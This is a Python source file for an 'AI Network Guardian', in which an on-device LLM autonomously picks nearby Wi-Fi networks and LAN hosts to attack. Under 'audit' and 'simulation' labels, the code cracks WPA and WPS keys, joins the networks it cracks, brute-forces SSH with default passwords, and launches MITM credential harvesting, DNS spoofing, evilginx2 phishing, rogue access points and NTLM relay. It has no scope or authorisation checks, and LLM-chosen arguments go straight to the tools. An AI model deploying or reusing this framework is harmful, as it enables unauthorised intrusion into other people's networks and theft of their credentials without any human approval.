# guardian_main.py
# This is the main orchestration script for the AI Network Guardian.
# It leverages an on-device LLM via the StackFlow framework (using ZMQ)
# to make autonomous decisions for network security auditing.

# REQUIRED DEPENDENCIES: This script requires several packages.
# Install them using: pip install -r requirements.txt

import time
import threading
import json
import os
import subprocess
import re
import xml.etree.ElementTree as ET
import glob
import csv
import uuid
import zmq  # Using pyzmq for StackFlow communication
import serial
import paramiko
import socket
import nmap
import asyncio
import asyncssh
from concurrent.futures import ThreadPoolExecutor, as_completed
import tempfile
import sys
import pathlib
from flask import Flask, request, jsonify, render_template

# Import centralized configuration
from config import *

# --- Base class for tool management (moved to top) ---
class ToolManager:
    """Base class for managing system tools and dependencies"""
    
    def _ensure_tools(self, tools, package_mapping=None):
        """Generic tool checker and installer"""
        update_status("Ensuring required tools are installed...", "Init")
        for tool in tools:
            try:
                # Use 'where' on Windows, 'which' on Unix
                cmd = ["where", tool] if os.name == 'nt' else ["which", tool]
                subprocess.run(cmd, check=True, capture_output=True, timeout=5)
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                update_status(f"Tool {tool} not found. Attempting to install...", "Init")
                try:
                    if package_mapping and tool in package_mapping:
                        # Skip installation on Windows for now
                        if os.name == 'nt':
                            update_status(f"Tool {tool} not available on Windows", "Warning")
                        else:
                            subprocess.run(["sudo", "apt-get", "install", "-y", package_mapping[tool]], check=True, timeout=120)
                            update_status(f"Successfully installed {tool}", "Init")
                    else:
                        update_status(f"Could not install {tool} automatically", "Warning")
                except Exception as e:
                    update_status(f"Failed to install {tool}: {e}", "Error")

# --- Robustness Improvements: Root, Config, Dependency Checks ---
# Root permission check (Windows compatible)
if os.name != 'nt':  # Only check on Unix-like systems
    if os.geteuid() != 0:
        print("[FATAL] AI Network Guardian must be run as root. Exiting.")
        sys.exit(1)

# Config loading (env vars or config.json)
CONFIG_PATH = os.environ.get("GUARDIAN_CONFIG", str(pathlib.Path(__file__).parent.parent / "config.json"))
config = {}
if os.path.exists(CONFIG_PATH):
    try:
        with open(CONFIG_PATH, 'r') as f:
            config = json.load(f)
    except Exception as e:
        print(f"[WARN] Failed to load config.json: {e}")

SD_CARD_LOG_PATH = os.environ.get("GUARDIAN_LOG_PATH", config.get("log_path", SD_CARD_LOG_PATH))
WIFI_AUDIT_INTERFACE = os.environ.get("GUARDIAN_WIFI_IFACE", config.get("wifi_interface", WIFI_AUDIT_INTERFACE))
LAN_INTERFACE = os.environ.get("GUARDIAN_LAN_IFACE", config.get("lan_interface", LAN_INTERFACE))

# Ensure log/state directory exists and is writable
try:
    os.makedirs(SD_CARD_LOG_PATH, exist_ok=True)
    testfile = os.path.join(SD_CARD_LOG_PATH, ".write_test")
    with open(testfile, 'w') as f: f.write("test")
    os.remove(testfile)
except Exception as e:
    print(f"[FATAL] Cannot write to log directory {SD_CARD_LOG_PATH}: {e}")
    sys.exit(1)

# Centralized dependency check (union of all required tools)
REQUIRED_TOOLS = [
    "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "nmcli", "iw", "reaver", "hostapd", "dnsmasq",
    "nmap", "ip", "arpspoof", "nikto", "hydra", "smbclient", "dhcpd", "curl", "masscan", "ntlmrelayx.py",
    "bettercap", "ettercap", "dnsspoof", "dnschef", "tcpdump", "tshark", "arp-scan", "arpwatch", "netdiscover",
    "wifite", "hcxdumptool", "hcxpcapngtool", "evilginx2", "setoolkit", "suricata", "nethogs", "iftop", "iptraf",
    "whois", "dig", "nslookup"
]
missing_tools = []
for tool in REQUIRED_TOOLS:
    cmd = ["where", tool] if os.name == 'nt' else ["which", tool]
    if subprocess.run(cmd, capture_output=True).returncode != 0:
        missing_tools.append(tool)
if missing_tools:
    print(f"[FATAL] Missing required tools: {', '.join(missing_tools)}. Please install them before running.")
    sys.exit(1)

# --- Global State ---
guardian_state = {
    "status": "Initializing", "current_phase": "Idle", "current_target_ssid": "N/A",
    "audited_networks": {}, "analyzed_hosts": {}, "log_stream": [],
    "ai_running": False, "stop_signal": threading.Event(), "wireless_mode": "managed",
    "ssh_accessible_hosts": {},
    "tool_results": {}  # New: tool/action name -> {stdout, stderr, timestamp, args}
}

# Global lock for thread safety
guardian_state_lock = threading.Lock()

# --- Global State Management Functions ---

# update_status Function
# Updates the global guardian_state with the current status message, phase, and target.
# It also appends the message to a log stream and prints it to the console.
def update_status(status_msg, phase=None, target=None):
    timestamp = time.ctime()
    log_entry = f"[{timestamp}] {status_msg}"
    with guardian_state_lock:
        guardian_state["log_stream"].append(log_entry)
        if len(guardian_state["log_stream"]) > 100:
            guardian_state["log_stream"] = guardian_state["log_stream"][-100:]
        guardian_state["status"] = status_msg
        if phase: guardian_state["current_phase"] = phase
        if target: guardian_state["current_target_ssid"] = target
    print(log_entry)

# log_to_sd_card Function
# Logs data to a specified file on the SD card. It deletes the log if it exceeds 10MB.
def log_to_sd_card(filename, data, max_size=10*1024*1024):
    full_path = os.path.join(SD_CARD_LOG_PATH, filename)
    try:
        if os.path.exists(full_path) and os.path.getsize(full_path) > max_size:
            os.remove(full_path)
        with open(full_path, 'a') as f:
            f.write(data + '\n')
    except Exception as e:
        print(f"Error logging to SD card {full_path}: {e}")

# save_state Function
# Persists the current guardian_state to a JSON file on the SD card.
# This allows the Guardian to resume operations after a restart.
def save_state():
    state_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
    try:
        with open(state_file, 'w') as f:
            serializable_state = guardian_state.copy()
            serializable_state["stop_signal"] = None
            json.dump(serializable_state, f, indent=2)
        update_status("Guardian state persisted to SD card.", "State Save")
    except Exception as e:
        update_status(f"Failed to save state: {e}", "Error")

# load_state Function
# Restores the guardian_state from a previously saved JSON file on the SD card.
# This enables stateful operation across reboots.
def load_state():
    state_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
    try:
        if os.path.exists(state_file):
            with open(state_file, 'r') as f:
                loaded_state = json.load(f)
                loaded_state["stop_signal"] = guardian_state["stop_signal"]
                guardian_state.update(loaded_state)
                update_status("Guardian state restored from SD card.", "State Load")
    except Exception as e:
        update_status(f"Failed to load state: {e}", "Error")

# send_via_uart Function
# Sends a JSON command over UART (Universal Asynchronous Receiver-Transmitter)
# and waits for a JSON response. This is used for communication with external modules.
def send_via_uart(cmd):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
        ser.write(json.dumps(cmd).encode() + b'\n')
        resp = ser.readline().decode().strip()
        return json.loads(resp) if resp else None
    except (serial.SerialException, json.JSONDecodeError, FileNotFoundError) as e:
        update_status(f"UART communication failed: {e}", "Error")
        return None

# --- Orchestrator ---
# --- Orchestrator Class ---
class AIAnalysisOrchestrator:
    """
    The central brain of the AI Network Guardian. This class orchestrates
    the entire security analysis process, making decisions based on LLM inference
    and coordinating various security modules.
    """
    # --- Constructor ---
    # Initializes the orchestrator with an LLM client and instances of
    # WiFiSecurityModule, PasswordStrengthAnalyzer, LanAnalyzer, and VulnerabilitySimulator.
    def __init__(self, llm_client, rpc_pass):
        self.llm = llm_client
        self.wifi = WiFiSecurityModule(WIFI_AUDIT_INTERFACE)
        self.analyzer = PasswordStrengthAnalyzer(AI_MODEL_PATH, llm_client)
        self.lan = LanAnalyzer(LAN_INTERFACE)

    # --- get_wifi_audit_decision Function ---
    # Queries the LLM to get a strategic decision on which Wi-Fi network to audit
    # and which method to use (e.g., CONNECT_OPEN, AUDIT_WPA2).
    # It prioritizes networks with weaker security.
    def get_wifi_audit_decision(self, networks):
        payload = {
            "networks": networks,
            "audited": list(guardian_state["audited_networks"].keys())
        }
        prompt = (
            "You are GuardianGPT, an AI network security analyst. Given the following Wi-Fi networks, "
            "select one SSID to audit and the best method (CONNECT_OPEN, AUDIT_WPA2, "
            "AUDIT_WPS, or SIMULATE_ROGUE_AP). Prioritize networks with weaker security. "
            "Respond ONLY with JSON:\n" + json.dumps(payload)
        )
        update_status(f"LLM Prompt: {prompt}", "AI Loop")
        try:
            response = self.llm.get_llm_inference(prompt)
            update_status(f"LLM Response: {response}", "AI Loop")
            return response
        except Exception as e:
            update_status(f"LLM inference failed: {e}", "Error")
            return None

    # --- get_internal_analysis_decision Function ---
    # Queries the LLM to get a strategic decision on the next internal network analysis action.
    # It provides context about analyzed hosts, audited networks, and past audit history
    # to help the AI make informed decisions.
    def get_internal_analysis_decision(self):
        audit_history = self.lan._load_audit_history()
        success_rates = self.lan._calculate_success_rates(audit_history)
        
        context = {
            "analyzed_hosts": guardian_state["analyzed_hosts"],
            "audited_networks": guardian_state["audited_networks"],
            "mitm_simulation": guardian_state.get("mitm_simulation"),
            "wan_ip": guardian_state.get("wan_ip"),
            "audit_history": audit_history,
            "success_rates": success_rates
        }

        prompt = f"""You are GuardianGPT, an AI-powered network security analyst. Your PRIMARY OBJECTIVE is to:
1. Identify all devices and services on the network.
2. Discover and validate potential security vulnerabilities.
3. Test the strength of credentials and configurations.
4. Provide actionable recommendations for improving security.

AVAILABLE TOOLS:
- SCAN_NETWORK: nmap -sV -O (Discovers hosts/services)
- VULNERABILITY_SCAN: nikto (Web app scanning)
- TEST_SERVICE_CREDS: hydra (Credential strength testing)
- ENUMERATE_SMB_SHARES: smbclient (Find open Windows shares)
- SIMULATE_ARP_POISONING: arpspoof (Test MITM resilience)
- SIMULATE_EXPLOIT: Metasploit framework vulnerability simulation
- ANALYZE_NEW_HOST: SSH tunneling/proxying for deeper analysis
- SIMULATE_DATA_EXFIL: Test for data leak prevention
- TEST_PRIVILEGE_ESCALATION: Simulate kernel/service exploits
- CHECK_PERSISTENCE: Look for backdoors/unauthorized SSH keys
- SIMULATE_NTLM_RELAY: Impacket NTLMv2 relay simulation
- SIMULATE_DHCP_WPAD_SPOOF: Rogue DHCP + WPAD hijack simulation
- MASSCAN_SCAN: High-speed port scan via masscan
- SELF_UPDATE: Pull latest code & tools

# --- Extended AI-Driven Tools ---
- BETTERCAP_MITM: bettercap (Advanced MITM, ARP/DNS spoofing, credential harvesting)
- ETTERCAP_MITM: ettercap (Classic MITM, ARP poisoning, sniffing)
- DNSSPOOF: dnsspoof (Simple DNS spoofing on LAN)
- DNSCHEF: dnschef (Configurable DNS proxy/redirection)
- TCPDUMP_CAPTURE: tcpdump (Packet capture for traffic analysis)
- TSHARK_ANALYZE: tshark (Deep packet/protocol inspection)
- ARPSCAN: arp-scan (ARP network scanning)
- ARPWATCH: arpwatch (Monitor ARP traffic for anomalies)
- NETDISCOVER: netdiscover (Live host discovery via ARP)
- WIFITE: wifite (Automated Wi-Fi attack/handshake capture)
- HCXDUMPT: hcxdumptool (Advanced WPA handshake/PMKID capture)
- HCXPCAPNG: hcxpcapngtool (Convert/parse Wi-Fi captures)
- EVILGINX2: evilginx2 (Phishing/MITM simulation)
- SETOOLKIT: setoolkit (Social engineering/phishing simulation)
- SURICATA: suricata (IDS/IPS, real-time traffic analysis)
- NETHOGS: nethogs (Per-process network monitoring)
- IFTOP: iftop (Bandwidth monitoring)
- IPTRAF: iptraf (Bandwidth monitoring)
- WHOIS: whois (External network intelligence)
- DIG: dig (DNS query/analysis)
- NSLOOKUP: nslookup (DNS query/analysis)

CURRENT NETWORK CONTEXT:
{json.dumps(context, indent=2)}

DECISION FRAMEWORK:
1. Analyze current network map.
2. Identify devices with the highest potential risk (e.g., exposed services).
3. Select the most appropriate tool to safely assess the risk.
4. Chain analyses logically (e.g., scan, then test creds).
5. Prioritize providing clear, actionable security advice.

RESPONSE FORMAT (JSON ONLY):
{{
    "action": "ACTION_NAME",
    "target_ip": "IP_ADDRESS",
    "port": "PORT_NUMBER",
    "service": "SERVICE_NAME",
    "reason": "Strategic justification for this security check.",
    "confidence": 75,
    "fallback": "ALTERNATE_ACTION"
}}"""
        update_status(f"LLM Prompt: {prompt}", "AI Loop")
        try:
            response = self.llm.get_llm_inference(prompt)
            update_status(f"LLM Response: {response}", "AI Loop")
            return response
        except Exception as e:
            update_status(f"LLM inference failed: {e}", "Error")
            return None

    # --- summarize_vulns Function ---
    # Sends raw Nmap and Nikto findings to the LLM to generate a summary
    # of critical issues with remediation steps.
    def summarize_vulns(self, host_results):
        prompt = (
          "You are GuardianGPT. Here are raw Nmap and Nikto findings:\n"
          + json.dumps(host_results)
          + "\nList the top 3 critical issues with remediation steps, in JSON."
        )
        return self.llm.get_llm_inference(prompt)

    # --- try_ssh_async Function (Asynchronous) ---
    # Attempts to establish an SSH connection asynchronously to a given host
    # with provided credentials. Returns True on success, False otherwise.
    async def try_ssh_async(self, host: str, user: str, pwd: str) -> bool:
        try:
            async with asyncssh.connect(host, username=user, password=pwd, 
                                     connect_timeout=5, login_timeout=5) as conn:
                return True
        except Exception:
            return False

    # --- audit_host_ssh_async Function (Asynchronous) ---
    # Asynchronously audits a single host for weak SSH credentials using a list of
    # username/password combinations. Updates status and logs findings.
    async def audit_host_ssh_async(self, host: str, creds: list[tuple[str,str]]):
        for user, pwd in creds:
            if guardian_state["stop_signal"].is_set(): return host, None
            update_status(f"Testing SSH {user}:{pwd} on {host} (async)", "SSH Audit")
            if await self.try_ssh_async(host, user, pwd):
                update_status(f"SUCCESS: SSH access to {host} with {user}:{pwd} is possible. Recommend changing password.", "Vulnerability Found")
                return host, (user, pwd)
        return host, None

    # --- audit_ssh_credentials Function ---
    # Orchestrates the SSH credential audit across a network CIDR.
    # It can run synchronously or asynchronously using ThreadPoolExecutor or asyncio.
    # It discovers hosts, proposes credentials using the analyzer, and attempts SSH connections.
    def audit_ssh_credentials(self, network_cidr: str, max_workers: int = 10, use_async: bool = False):
        update_status(f"Starting SSH credential audit on {network_cidr}...", "SSH Audit")
        hosts = discover_hosts(network_cidr)
        results = []
        for host in hosts:
            creds = self.analyzer.propose_ssh_creds(host) or STATIC_CREDS
            for user, pwd in creds:
                update_status(f"Testing SSH {user}:{pwd} on {host}", "SSH Audit")
                if try_ssh(host, user, pwd):
                    update_status(f"VULNERABILITY: SSH access to {host} with weak password {user}:{pwd}", "Vulnerability Found")
                    guardian_state.setdefault("ssh_accessible_hosts", {})[host] = {"user": user, "pass": pwd}
                    guardian_state["analyzed_hosts"].setdefault(host, {})["ssh"] = {"user": user, "pass": pwd, "remediation": "Change default/weak password immediately."}
                    self._log_audit_result("SSH", host, True, f"Weak credentials found: {user}:{pwd}")
                    results.append((host, user, pwd))
                else:
                    update_status(f"FAILED: SSH access to {host} with {user}:{pwd}", "SSH Audit")
        update_status(f"SSH credential audit complete. Found {len(results)} hosts with weak passwords.", "SSH Audit")

    # --- _log_audit_result Function (Private) ---
    # Logs the result of an audit action to a JSON file on the SD card.
    # This helps in maintaining a history of all security checks performed.
    def _log_audit_result(self, action, target, success, details):
        entry = { "timestamp": time.time(), "action": action, "target": target, "success": success, "details": details }
        history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
        history = self.lan._load_audit_history()
        history.append(entry)
        try:
            with open(history_file, 'w') as f: json.dump(history, f)
        except Exception as e:
            update_status(f"Failed to log audit result: {e}", "Warning")

    # --- Main Loop and Analysis Sequence ---
    def ai_guardian_loop(self):
        update_status("AI Guardian loop started.", "AI Loop")
        while not guardian_state["stop_signal"].is_set():
            # Log LLM prompt and response for every decision
            update_status("Querying LLM for next action...", "AI Loop")
            # Example: Wi-Fi audit decision
            networks = self.wifi.scan_wifi_networks()
            update_status(f"Scanned networks: {json.dumps(networks)}", "AI Loop")
            llm_prompt = self.get_wifi_audit_decision(networks)
            update_status(f"LLM Prompt: {llm_prompt}", "AI Loop")
            if not getattr(self, "updated", False) and self.lan.get_wan_ip():
                self.execute_internal_analysis_sequence()
                self.updated = True
            
            guardian_state["ai_running"] = True
            
            if not guardian_state["audited_networks"]:
                networks = self.wifi.scan_wifi_networks()
                available = [n for n in networks if n.get("ssid") not in guardian_state["audited_networks"]]
                if not available:
                    time.sleep(30)
                    continue

                decision = self.get_wifi_audit_decision(available)
                if not decision or "target_ssid" not in decision:
                    time.sleep(10)
                    continue

                target_ssid = decision["target_ssid"]
                target_net = next((n for n in available if n["ssid"] == target_ssid), None)
                if not target_net: continue

                success = False
                action = decision.get("action")

                if action == "CONNECT_OPEN":
                    success = self.wifi.connect_to_network(target_ssid)
                    if success: guardian_state["audited_networks"][target_ssid] = "N/A (Open)"
                
                elif action == "AUDIT_WPA2":
                    handshake_file = self.wifi.capture_handshake_for_audit(target_ssid, target_net["bssid"], target_net["channel"])
                    if handshake_file:
                        password = self.analyzer.analyze_handshake(handshake_file, target_ssid)
                        if password:
                            update_status(f"VULNERABILITY: Weak password '{password}' found for {target_ssid}. Recommend changing it.", "Vulnerability Found")
                            success = self.wifi.connect_to_network(target_ssid, password)
                            if success: guardian_state["audited_networks"][target_ssid] = password
                
                elif action == "AUDIT_WPS":
                    password = self.wifi.audit_wps(target_net["bssid"])
                    if password:
                        success = self.wifi.connect_to_network(target_ssid, password)
                        if success: guardian_state["audited_networks"][target_ssid] = password

                elif action == "SIMULATE_ROGUE_AP":
                    real_bssid = target_net.get("bssid") if isinstance(target_net, dict) else None
                    if self.wifi.simulate_rogue_ap(target_ssid, target_net["channel"], self.llm, real_bssid=real_bssid):
                        update_status(f"Rogue AP simulation for {target_ssid} is active.", "Simulation")
                    
                if success:
                    log_to_sd_card("audited_wifi.log", f"{target_ssid}:{guardian_state['audited_networks'][target_ssid]}")
                    save_state()
                    self.execute_internal_analysis_sequence()
                else:
                    update_status(f"Audit of {target_ssid} with method {action} complete. No immediate vulnerabilities found.", "Wi-Fi Audit", target_ssid)
            else:
                self.execute_internal_analysis_sequence()
            
            save_state()
            guardian_state["stop_signal"].wait(timeout=60)
        
        self.llm.close()
        update_status("AI Network Guardian stopped.", "Stopped")

    def execute_internal_analysis_sequence(self):
        update_status("Starting internal network analysis...", "Internal Analysis")
        decision = self.get_internal_analysis_decision()
        if not decision or "action" not in decision:
            update_status("AI failed to provide a valid analysis decision. Defaulting to network scan.", "Error")
            _, subnet_range = self.lan.get_local_ip_and_subnet()
            if subnet_range: 
                results = self.lan.run_nmap_scan(subnet_range)
                if results:
                    summary = self.summarize_vulns(results)
                    update_status(f"Vulnerability Summary: {json.dumps(summary, indent=2)}", "Discovery")
            return

        action = decision.get("action")
        target_ip = decision.get("target_ip")
        port = decision.get("port")
        service = decision.get("service")

        if action == "SCAN_NETWORK":
            _, subnet_range = self.lan.get_local_ip_and_subnet()
            if subnet_range: 
                results = self.lan.run_nmap_scan(subnet_range)
                if results:
                    summary = self.summarize_vulns(results)
                    update_status(f"Vulnerability Summary: {json.dumps(summary, indent=2)}", "Discovery")
                self.audit_ssh_credentials(subnet_range)
        
        elif action == "VULNERABILITY_SCAN":
            if target_ip and port: 
                results = self.lan.run_nikto_scan(target_ip, port)
                if results:
                    summary = self.summarize_vulns({target_ip: {"vulnerabilities": {port: results}}})
                    update_status(f"Vulnerability Summary for {target_ip}:{port}: {json.dumps(summary, indent=2)}", "Discovery")
            else: update_status("Vulnerability scan requires target_ip and port.", "Error")

        elif action == "TEST_SERVICE_CREDS":
            if target_ip and port and service:
                self.lan.test_service_credentials(target_ip, port, service, self.analyzer.common_passwords)
            else: update_status("Credential test requires target_ip, port, and service.", "Error")

        elif action == "ENUMERATE_SMB_SHARES":
            if target_ip: self.lan.enumerate_smb_shares(target_ip)
            else: update_status("SMB enumeration requires target_ip.", "Error")
        
        elif action == "SIMULATE_NTLM_RELAY":
            targets = decision.get("targets", [])
            if targets: self.lan.simulate_ntlm_relay(targets)
            else: update_status("SIMULATE_NTLM_RELAY needs a list of target IPs", "Error")

        elif action == "SIMULATE_DHCP_WPAD_SPOOF":
            dns = decision.get("rogue_dns")
            self.lan.simulate_dhcp_wpad_spoof(rogue_dns=dns)

        elif action == "MASSCAN_SCAN":
            cidr = decision.get("cidr")
            if cidr:
                results = self.lan.masscan_scan(cidr)
                update_status(f"masscan results: {results}", "Discovery")
            else: update_status("MASSCAN_SCAN needs cidr", "Error")

        elif action == "SIMULATE_EXPLOIT":
            if target_ip and port and service:
                exploit_name = self._get_metasploit_exploit(service, port)
                if exploit_name:
                    update_status(f"(Metasploit removed) Would have run exploit: {exploit_name} on {target_ip}", "Simulation")
                else:
                    update_status(f"No known exploit check for {service} on port {port}", "Info")
            else:
                update_status("Exploit simulation requires target_ip, port and service", "Error")

        elif action == "BETTERCAP_MITM":
            args = decision.get("args", [])
            result = run_tool("bettercap", args)
            now = time.ctime()
            guardian_state["tool_results"]["bettercap"] = {"stdout": getattr(result, "stdout", None), "stderr": getattr(result, "stderr", None), "timestamp": now, "args": args}
            if result:
                update_status(f"bettercap output: {result.stdout}", "MITM")
            else:
                update_status("bettercap failed.", "Error")

        elif action == "ETTERCAP_MITM":
            args = decision.get("args", [])
            result = run_tool("ettercap", args)
            now = time.ctime()
            guardian_state["tool_results"]["ettercap"] = {"stdout": getattr(result, "stdout", None), "stderr": getattr(result, "stderr", None), "timestamp": now, "args": args}
            if result:
                update_status(f"ettercap output: {result.stdout}", "MITM")
            else:
                update_status("ettercap failed.", "Error")

        elif action == "DNSSPOOF":
            args = decision.get("args", [])
            result = run_tool("dnsspoof", args)
            if result:
                update_status(f"dnsspoof output: {result.stdout}", "DNS Spoof")
            else:
                update_status("dnsspoof failed.", "Error")

        elif action == "DNSCHEF":
            args = decision.get("args", [])
            result = run_tool("dnschef", args)
            if result:
                update_status(f"dnschef output: {result.stdout}", "DNS Spoof")
            else:
                update_status("dnschef failed.", "Error")

        elif action == "TCPDUMP_CAPTURE":
            args = decision.get("args", [])
            result = run_tool("tcpdump", args)
            if result:
                update_status(f"tcpdump output: {result.stdout}", "Packet Capture")
            else:
                update_status("tcpdump failed.", "Error")

        elif action == "TSHARK_ANALYZE":
            args = decision.get("args", [])
            result = run_tool("tshark", args)
            if result:
                update_status(f"tshark output: {result.stdout}", "Packet Analysis")
            else:
                update_status("tshark failed.", "Error")

        elif action == "ARPSCAN":
            args = decision.get("args", [])
            result = run_tool("arp-scan", args)
            if result:
                update_status(f"arp-scan output: {result.stdout}", "ARP Scan")
            else:
                update_status("arp-scan failed.", "Error")

        elif action == "ARPWATCH":
            args = decision.get("args", [])
            proc = run_tool("arpwatch", args)
            if proc and hasattr(proc, 'pid'):
                update_status(f"arpwatch started (pid {proc.pid})", "ARP Watch")
            elif proc:
                update_status("arpwatch started successfully", "ARP Watch")
            else:
                update_status("arpwatch failed.", "Error")

        elif action == "NETDISCOVER":
            args = decision.get("args", [])
            result = run_tool("netdiscover", args)
            if result:
                update_status(f"netdiscover output: {result.stdout}", "Netdiscover")
            else:
                update_status("netdiscover failed.", "Error")

        elif action == "WIFITE":
            args = decision.get("args", [])
            result = run_tool("wifite", args)
            if result:
                update_status(f"wifite output: {result.stdout}", "WiFi Attack")
            else:
                update_status("wifite failed.", "Error")

        elif action == "HCXDUMPT":
            args = decision.get("args", [])
            result = run_tool("hcxdumptool", args)
            if result:
                update_status(f"hcxdumptool output: {result.stdout}", "WiFi Capture")
            else:
                update_status("hcxdumptool failed.", "Error")

        elif action == "HCXPCAPNG":
            args = decision.get("args", [])
            result = run_tool("hcxpcapngtool", args)
            if result:
                update_status(f"hcxpcapngtool output: {result.stdout}", "WiFi Capture")
            else:
                update_status("hcxpcapngtool failed.", "Error")

        elif action == "EVILGINX2":
            args = decision.get("args", [])
            proc = run_tool("evilginx2", args)
            if proc and hasattr(proc, 'pid'):
                update_status(f"evilginx2 started (pid {proc.pid})", "Phishing Simulation")
            elif proc:
                update_status("evilginx2 started successfully", "Phishing Simulation")
            else:
                update_status("evilginx2 failed.", "Error")

        elif action == "SETOOLKIT":
            args = decision.get("args", [])
            proc = run_tool("setoolkit", args)
            if proc and hasattr(proc, 'pid'):
                update_status(f"setoolkit started (pid {proc.pid})", "Phishing Simulation")
            elif proc:
                update_status("setoolkit started successfully", "Phishing Simulation")
            else:
                update_status("setoolkit failed.", "Error")

        elif action == "SURICATA":
            args = decision.get("args", [])
            result = run_tool("suricata", args)
            if result:
                update_status(f"suricata output: {result.stdout}", "IDS/IPS")
            else:
                update_status("suricata failed.", "Error")

        elif action == "NETHOGS":
            args = decision.get("args", [])
            result = run_tool("nethogs", args)
            if result:
                update_status(f"nethogs output: {result.stdout}", "Net Monitor")
            else:
                update_status("nethogs failed.", "Error")

        elif action == "IFTOP":
            args = decision.get("args", [])
            result = run_tool("iftop", args)
            if result:
                update_status(f"iftop output: {result.stdout}", "Net Monitor")
            else:
                update_status("iftop failed.", "Error")

        elif action == "IPTRAF":
            args = decision.get("args", [])
            result = run_tool("iptraf", args)
            if result:
                update_status(f"iptraf output: {result.stdout}", "Net Monitor")
            else:
                update_status("iptraf failed.", "Error")

        elif action == "WHOIS":
            args = decision.get("args", [])
            result = run_tool("whois", args)
            if result:
                update_status(f"whois output: {result.stdout}", "Whois")
            else:
                update_status("whois failed.", "Error")

        elif action == "DIG":
            args = decision.get("args", [])
            result = run_tool("dig", args)
            if result:
                update_status(f"dig output: {result.stdout}", "DNS Query")
            else:
                update_status("dig failed.", "Error")

        elif action == "NSLOOKUP":
            args = decision.get("args", [])
            result = run_tool("nslookup", args)
            if result:
                update_status(f"nslookup output: {result.stdout}", "DNS Query")
            else:
                update_status("nslookup failed.", "Error")

    def _get_metasploit_exploit(self, service, port):
        service = service.lower()
        if "http" in service: return "exploit/multi/http/struts2_content_type_ognl"
        elif "smb" in service and port == "445": return "exploit/windows/smb/ms17_010_eternalblue"
        elif "ssh" in service and port == "22": return "exploit/multi/ssh/sshexec"
        return None

# --- Host Discovery Helper Functions ---

# discover_hosts Function
# Discovers live hosts on a given network CIDR using Nmap's ping scan (`-sn`).
# Returns a list of IP addresses of active hosts.
def discover_hosts(network_cidr: str) -> list[str]:
    update_status(f"Discovering live hosts on {network_cidr} using Nmap...", "Discovery")
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=network_cidr, arguments='-sn')
        live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
        update_status(f"Found {len(live_hosts)} live hosts.", "Discovery")
        return live_hosts
    except nmap.PortScannerError as e:
        update_status(f"Nmap host discovery failed: {e}", "Error")
        return []
    except Exception as e:
        update_status(f"Error during host discovery: {e}", "Error")
        return []

# --- SSH Attempt Logic Functions ---
STATIC_CREDS = [("root","root"), ("admin","admin"), ("pi","raspberry"), ("user","user")]

# try_ssh Function
# Attempts to establish an SSH connection to a given host with provided credentials.
# Returns True if the connection is successful, False otherwise.
def try_ssh(host: str, user: str, pwd: str, timeout: float=5.0) -> bool:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=user, password=pwd, timeout=timeout, banner_timeout=timeout)
        ssh.close()
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
        return False
    except Exception as e:
        update_status(f"Unexpected error during SSH attempt on {host}: {e}", "Error")
        return False

# --- LLM Communication Module (ZMQ StackFlow Client) Class ---
class StackFlowClient:
    """
    A client class for communicating with the on-device Large Language Model (LLM)
    via the StackFlow framework using ZeroMQ (ZMQ). It handles connection,
    LLM setup, and inference requests.
    """
    # --- Constructor ---
    # Initializes the ZMQ client with the LLM endpoint and sets up ZMQ sockets and poller.
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.context = zmq.Context.instance()
        self.socket = None
        self.llm_work_id = None
        self.poller = zmq.Poller()
        self.max_retries = 3
        self.request_timeout = 30000
        self._initialize_socket()

    # --- _initialize_socket Function (Private) ---
    # Initializes or re-initializes the ZMQ request socket, unregistering and closing
    # any existing socket before creating a new one and connecting to the endpoint.
    def _initialize_socket(self):
        if self.socket:
            self.poller.unregister(self.socket)
            self.socket.close()
        
        self.socket = self.context.socket(zmq.REQ)
        assert self.socket is not None, "Socket creation failed"
        self.socket.setsockopt(zmq.LINGER, 0)
        self.socket.setsockopt(zmq.RCVTIMEO, self.request_timeout)
        self.poller.register(self.socket, zmq.POLLIN)
        self.socket.connect(self.endpoint)

    # --- _lazy_pirate_request Function (Private) ---
    # Implements a "Lazy Pirate" retry pattern for robust ZMQ requests.
    # It retries sending a request multiple times and re-initializes the socket
    # if a timeout or ZMQ error occurs. Falls back to UART if max retries are reached.
    def _lazy_pirate_request(self, data):
        retries = 0
        while retries < self.max_retries:
            try:
                assert self.socket is not None
                self.socket.send_json(data)
                socks = dict(self.poller.poll(self.request_timeout))
                if socks.get(self.socket) == zmq.POLLIN:
                    assert self.socket is not None
                    return self.socket.recv_json()
                else:
                    raise zmq.Again()
            except (zmq.Again, zmq.ZMQError) as e:
                retries += 1
                update_status(f"Request failed (attempt {retries}/{self.max_retries}): {e}", "Warning")
                self._initialize_socket()
                continue
        update_status("Max ZMQ retries reached, attempting UART fallback.", "Warning")
        return send_via_uart(data)

    # --- _send_and_receive_json Function (Private) ---
    # A wrapper around `_lazy_pirate_request` to send and receive JSON data.
    # It handles general exceptions during ZMQ communication.
    def _send_and_receive_json(self, data):
        try:
            return self._lazy_pirate_request(data)
        except Exception as e:
            update_status(f"ZMQ communication error: {e}", "Error")
            return None

    # --- reset_system Function ---
    # Sends a reset command to the StackFlow system before setup.
    def reset_system(self):
        update_status("Resetting StackFlow system...", "AI Init")
        reset_req = {
            "request_id": str(uuid.uuid4()),
            "work_id": "sys",
            "action": "reset"
        }
        response = self._send_and_receive_json(reset_req)
        if response and isinstance(response, dict) and isinstance(response.get("error", {}), dict) and response.get("error", {}).get("code") == 0:
            update_status("StackFlow system reset successfully.", "AI Init")
            return True
        error_details = response.get('error', 'Unknown error') if (response and isinstance(response, dict) and hasattr(response, 'get')) else 'No response'
        update_status(f"StackFlow system reset failed: {error_details}", "Error")
        return False

    # --- setup_llm Function ---
    # Configures the LLM with a specified model and initial prompt.
    # It sends a setup request to the StackFlow service and stores the `llm_work_id`
    # for subsequent inference requests.
